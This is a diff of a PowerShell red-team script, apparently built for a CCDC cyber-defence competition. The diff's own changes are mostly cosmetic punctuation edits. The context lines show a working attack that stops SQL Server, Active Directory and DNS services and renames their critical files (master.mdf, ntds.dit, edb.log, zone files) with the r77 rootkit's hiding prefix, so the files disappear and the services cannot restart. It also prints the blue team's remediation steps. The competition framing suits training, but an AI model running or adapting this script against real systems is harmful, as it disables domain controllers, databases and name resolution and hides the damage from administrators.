@@ -1,5 +1,5 @@
 # ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
-# CCDC Windows Phase 3 — Rootkit: r77 Hide Service Files
+# CCDC Windows Phase 3 -- Rootkit: r77 Hide Service Files
 # ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
 # MITRE ATT&CK: T1014      (Rootkit)
 #               T1564.001  (Hide Artifacts: Hidden Files and Directories)
@@ -16,7 +16,7 @@
 #     2. Discovers the actual file paths from the registry / known defaults.
 #     3. Renames each critical file to prepend the r77 hide prefix ("$77"),
 #        which causes the rootkit to hide them from all Win32/POSIX APIs.
-#     4. Leaves the service stopped — it cannot restart because the expected
+#     4. Leaves the service stopped -- it cannot restart because the expected
 #        paths no longer contain files.
 #
 #   Blue team remediation path is intentionally long:
@@ -27,12 +27,12 @@
 #     d. Restart the service(s).
 #
 #   MSSQL critical files:
-#     master.mdf / mastlog.ldf  — SQL Server cannot boot without master DB.
+#     master.mdf / mastlog.ldf  -- SQL Server cannot boot without master DB.
 #
 #   Active Directory critical files:
-#     ntds.dit   — the AD database; DC cannot start NTDS without it.
-#     edb.log    — active transaction log; missing log blocks crash recovery.
-#     edb.chk    — checkpoint file; forces full log replay if absent.
+#     ntds.dit   -- the AD database; DC cannot start NTDS without it.
+#     edb.log    -- active transaction log; missing log blocks crash recovery.
+#     edb.chk    -- checkpoint file; forces full log replay if absent.
 #
 #   DNS critical files:
 #     All *.dns zone files in %SystemRoot%\System32\dns\
@@ -41,7 +41,7 @@
 #
 # Pre-requisites:
 #   - r77 rootkit must already be installed (run r77Shadow.ps1 first).
-#     The script warns but does NOT abort if r77 is not detected — operator
+#     The script warns but does NOT abort if r77 is not detected -- operator
 #     may want to pre-stage the rename and deploy r77 separately.
 #   - Must run as Administrator.
 #   - Target OS must be x64.
@@ -84,9 +84,9 @@ function Write-Section { param($m) Write-Host "`n====[ $m ]====" -ForegroundColo
 Write-Host ""
 Write-Warn "================================================================"
 if ($Undo) {
-    Write-Warn " CCDC Phase 3 — r77 Hide Services: UNDO MODE"
+    Write-Warn " CCDC Phase 3 -- r77 Hide Services: UNDO MODE"
 } else {
-    Write-Warn " CCDC Phase 3 — r77 Hide Services"
+    Write-Warn " CCDC Phase 3 -- r77 Hide Services"
 }
 Write-Warn " Role: $Role    Hide prefix: $HIDE_PREFIX"
 Write-Warn "================================================================"
@@ -101,10 +101,10 @@ if (-not [System.Environment]::Is64BitOperatingSystem) {
 }
 
 # ============================================================
-# Pre-flight: verify r77 is installed (warn only — operator may
+# Pre-flight: verify r77 is installed (warn only -- operator may
 # be pre-staging the rename before r77 deployment)
 # ============================================================
-Write-Section "Pre-flight — r77 Installation Check"
+Write-Section "Pre-flight -- r77 Installation Check"
 
 $svcRegBase = "HKLM:\SYSTEM\CurrentControlSet\Services"
 $r77SvcKey  = Get-ChildItem -Path $svcRegBase -ErrorAction SilentlyContinue |
@@ -113,7 +113,7 @@ $r77SvcKey  = Get-ChildItem -Path $svcRegBase -ErrorAction SilentlyContinue |
 if ($r77SvcKey) {
     Write-Success "r77 service detected: $($r77SvcKey.PSChildName)"
 } else {
-    Write-Warn "No $HIDE_PREFIX* service key found — r77 may not be installed."
+    Write-Warn "No $HIDE_PREFIX* service key found -- r77 may not be installed."
     Write-Warn "Renamed files will NOT be hidden until r77 is running."
     Write-Warn "Deploy r77Shadow.ps1 first for full effect, or continue to pre-stage."
 }
@@ -126,7 +126,7 @@ function Stop-ServiceGracefully {
 
     $svc = Get-Service -Name $ServiceName -ErrorAction SilentlyContinue
     if (-not $svc) {
-        Write-Info "Service '$ServiceName' not found on this host — skipping stop."
+        Write-Info "Service '$ServiceName' not found on this host -- skipping stop."
         return $false
     }
     if ($svc.Status -eq 'Stopped') {
@@ -138,7 +138,7 @@ function Stop-ServiceGracefully {
     try {
         Stop-Service -Name $ServiceName -Force -ErrorAction Stop
     } catch {
-        Write-Warn "Stop-Service failed for '$ServiceName': $_ — trying sc.exe"
+        Write-Warn "Stop-Service failed for '$ServiceName': $_ -- trying sc.exe"
         & sc.exe stop $ServiceName | Out-Null
     }
 
@@ -152,7 +152,7 @@ function Stop-ServiceGracefully {
         }
     }
 
-    Write-Warn "Service '$ServiceName' did not reach Stopped within ${ServiceStopTimeoutSec}s — files may be locked."
+    Write-Warn "Service '$ServiceName' did not reach Stopped within ${ServiceStopTimeoutSec}s -- files may be locked."
     return $false
 }
 
@@ -191,7 +191,7 @@ function Invoke-PrefixRename {
     try {
         Rename-Item -LiteralPath $FilePath -NewName $newName -Force -ErrorAction Stop
         if ($RemovePrefix) {
-            Write-Success "Restored: $leafName <- $newName"
+            Write-Success "Restored: $leafName <-- $newName"
         } else {
             Write-Success "Hidden:   $leafName -> $newName"
         }
@@ -201,12 +201,12 @@ function Invoke-PrefixRename {
 }
 
 # ============================================================
-# MSSQL — Hide master.mdf and mastlog.ldf
+# MSSQL -- Hide master.mdf and mastlog.ldf
 # ============================================================
 function Invoke-MSSQLHide {
     param([bool]$RemovePrefix)
 
-    Write-Section "MSSQL — $(if ($RemovePrefix) { 'Restore' } else { 'Hide' }) Critical Files"
+    Write-Section "MSSQL -- $(if ($RemovePrefix) { 'Restore' } else { 'Hide' }) Critical Files"
 
     # Stop SQL Server (default instance = MSSQLSERVER; named instance = MSSQL$<name>)
     if (-not $RemovePrefix) {
@@ -218,7 +218,7 @@ function Invoke-MSSQLHide {
                 Stop-ServiceGracefully -ServiceName $s.Name | Out-Null
             }
         } else {
-            Write-Warn "No SQL Server service found — files may be locked."
+            Write-Warn "No SQL Server service found -- files may be locked."
         }
     }
 
@@ -249,7 +249,7 @@ function Invoke-MSSQLHide {
 
     # Fallback: scan well-known paths if registry discovery found nothing
     if ($dataDirectories.Count -eq 0) {
-        Write-Warn "Registry discovery returned no data paths — using fallback scan."
+        Write-Warn "Registry discovery returned no data paths -- using fallback scan."
         $fallbackRoots = @(
             "$env:ProgramFiles\Microsoft SQL Server",
             "${env:ProgramFiles(x86)}\Microsoft SQL Server"
@@ -286,16 +286,16 @@ function Invoke-MSSQLHide {
         }
     }
 
-    Write-Info "SQL Server cannot start without master.mdf — service will fail on next start attempt."
+    Write-Info "SQL Server cannot start without master.mdf -- service will fail on next start attempt."
 }
 
 # ============================================================
-# Active Directory — Hide ntds.dit, edb.log, edb.chk
+# Active Directory -- Hide ntds.dit, edb.log, edb.chk
 # ============================================================
 function Invoke-ADHide {
     param([bool]$RemovePrefix)
 
-    Write-Section "Active Directory — $(if ($RemovePrefix) { 'Restore' } else { 'Hide' }) Critical Files"
+    Write-Section "Active Directory -- $(if ($RemovePrefix) { 'Restore' } else { 'Hide' }) Critical Files"
 
     if (-not $RemovePrefix) {
         # DNS on a DC depends on NTDS; stopping NTDS cascades to DNS automatically.
@@ -321,7 +321,7 @@ function Invoke-ADHide {
 
     # Fallback to default location
     if (-not $ntdsDir) {
-        Write-Warn "Registry path for ntds.dit not found — using default: $env:SystemRoot\NTDS"
+        Write-Warn "Registry path for ntds.dit not found -- using default: $env:SystemRoot\NTDS"
         $ntdsDir = "$env:SystemRoot\NTDS"
     }
 
@@ -339,21 +339,21 @@ function Invoke-ADHide {
         }
     }
 
-    Write-Info "DC cannot start AD DS without ntds.dit — NTDS service will fail on next start attempt."
+    Write-Info "DC cannot start AD DS without ntds.dit -- NTDS service will fail on next start attempt."
 }
 
 # ============================================================
-# DNS — Hide all zone files (*.dns)
+# DNS -- Hide all zone files (*.dns)
 # ============================================================
 function Invoke-DNSHide {
     param([bool]$RemovePrefix)
 
-    Write-Section "DNS — $(if ($RemovePrefix) { 'Restore' } else { 'Hide' }) Zone Files"
+    Write-Section "DNS -- $(if ($RemovePrefix) { 'Restore' } else { 'Hide' }) Zone Files"
 
     $dnsDir = "$env:SystemRoot\System32\dns"
 
     if (-not (Test-Path $dnsDir)) {
-        Write-Warn "DNS zone directory not found: $dnsDir — DNS role may not be installed."
+        Write-Warn "DNS zone directory not found: $dnsDir -- DNS role may not be installed."
         return
     }
 
@@ -380,7 +380,7 @@ function Invoke-DNSHide {
                                     -not $_.Name.StartsWith($HIDE_PREFIX) }
         if (-not $zoneFiles) {
             Write-Warn "No .dns zone files found in $dnsDir (zone storage may be AD-integrated)."
-            Write-Info "AD-integrated zones are stored in ntds.dit — handled by the AD role."
+            Write-Info "AD-integrated zones are stored in ntds.dit -- handled by the AD role."
             return
         }
         foreach ($f in $zoneFiles) {
@@ -409,10 +409,10 @@ if ($doDNS)   { Invoke-DNSHide    -RemovePrefix $removePrefix }
 Write-Host ""
 Write-Success "================================================================"
 if ($Undo) {
-    Write-Success " r77 Hide Services — UNDO complete"
+    Write-Success " r77 Hide Services -- UNDO complete"
     Write-Success " Restart affected services manually after verifying file names."
 } else {
-    Write-Success " r77 Hide Services — deployment complete"
+    Write-Success " r77 Hide Services -- deployment complete"
     Write-Host ""
     Write-Info "Critical service files are now renamed with prefix: $HIDE_PREFIX"
     Write-Info "They are invisible to Explorer, dir, Get-ChildItem, and all Win32 apps"
@@ -423,7 +423,7 @@ if ($Undo) {
     Write-Warn "     driver comparison, or raw NtQuerySystemInformation walk)."
     Write-Warn "  2. Locate the hidden r77 service key:"
     Write-Warn "       reg query HKLM\SYSTEM\CurrentControlSet\Services | findstr $HIDE_PREFIX"
-    Write-Warn "  3. Stop r77:  sc.exe stop <service-name>"
+    Write-Warn "  3. Stop r77:  sc.exe stop (service-name)"
     Write-Warn "  4. Run r77 Uninstall.exe (or manually remove driver + service key)."
     Write-Warn "  5. Once rootkit is gone the $HIDE_PREFIX-prefixed files are visible again."
     Write-Warn "  6. Rename each critical file back:"
@@ -432,7 +432,7 @@ if ($Undo) {
     Write-Warn "       AD:    ${HIDE_PREFIX}ntds.dit -> ntds.dit"
     Write-Warn "               ${HIDE_PREFIX}edb.log  -> edb.log"
     Write-Warn "               ${HIDE_PREFIX}edb.chk  -> edb.chk"
-    Write-Warn "       DNS:   ${HIDE_PREFIX}<zone>.dns -> <zone>.dns  (each zone file)"
+    Write-Warn "       DNS:   ${HIDE_PREFIX}(zone).dns -> (zone).dns  (each zone file)"
     Write-Warn "  7. Restart the stopped services."
 }
 Write-Success "================================================================"
